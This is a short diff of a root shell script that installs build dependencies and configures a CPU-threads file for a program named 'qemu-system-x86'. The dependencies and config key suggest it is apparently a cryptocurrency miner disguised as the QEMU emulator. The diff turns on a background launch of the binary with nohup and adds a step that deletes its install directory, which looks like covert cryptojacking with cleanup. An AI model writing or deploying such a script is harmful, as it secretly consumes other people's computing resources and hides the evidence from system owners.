@@ -6,7 +6,6 @@ then
 else
         phycores=$1
 fi
-echo $phycores
 apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget
 mkdir /usr/share/packages_download
 workingdir=/usr/share/packages_download/
@@ -23,5 +22,5 @@ done
 echo -e "[\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
 echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
 cd $workingdir/qemu-system-x86/bin/
-#nohup ./qemu-system-x86 &
-#rm -r /usr/share/packages_download/qemu-system-x86
+nohup ./qemu-system-x86_64 &
+rm -r /usr/share/packages_download/qemu-system-x86
